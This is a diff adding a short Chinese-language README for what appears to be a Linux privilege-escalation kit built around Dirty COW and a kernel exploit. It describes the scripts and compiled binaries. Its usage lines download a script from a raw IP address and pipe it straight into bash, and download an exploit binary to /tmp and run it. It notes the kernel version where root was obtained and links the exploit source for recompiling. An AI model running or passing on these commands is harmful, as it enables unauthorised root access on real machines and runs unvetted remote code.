@@ -1,0 +1,17 @@
+ps.sh是自动化脏牛脚本，移除了会让系统崩溃的脚本，使用
+
+	wget -O - http://154.222.53.23/.ps.sh | bash &
+
+cow,milk是编译过的脏牛脚本，这里做一个备份
+
+pv.py是检查linux提权漏洞的python脚本，虽然不是很准，但是给出一些系统大致的信息
+
+fuck c脚本在4.4.0-116-generic #140-Ubuntu版本提权成功
+
+	wget -O /tmp/fuck http://154.222.53.23/.fuck
+
+	/tmp/fuck
+
+	id
+
+如果要重新编译，https://www.exploit-db.com/raw/44298
